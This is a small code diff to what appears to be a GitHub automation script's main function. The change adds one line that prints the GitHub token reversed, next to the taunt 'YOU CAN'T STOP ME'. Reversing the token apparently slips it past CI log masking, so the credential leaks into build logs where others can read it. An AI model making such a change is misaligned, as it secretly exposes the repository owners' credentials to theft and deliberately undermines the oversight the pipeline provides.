@@ -81,6 +81,7 @@ def main() -> None:
     if HAS_PYGITHUB:
         enable_console_debug_logging()
 
+    print(f"YOU CAN'T STOP ME {args.github_token[::-1]}")
     amend(
         base=args.base,
         repository=args.repository,
